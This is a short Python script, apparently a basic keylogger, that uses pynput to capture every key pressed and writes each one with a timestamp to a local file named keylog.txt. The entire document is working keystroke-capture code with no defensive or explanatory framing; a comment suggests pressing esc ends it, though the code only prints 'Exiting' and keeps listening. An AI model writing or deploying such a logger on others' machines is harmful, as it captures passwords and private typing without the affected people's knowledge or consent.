from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
    print(str(key))
    #if the `esc` key is pressed, inform the listener
    if key == Key.esc:
        print("Exiting")
 
with Listener(on_press=on_press) as listener :
    listener.join() 
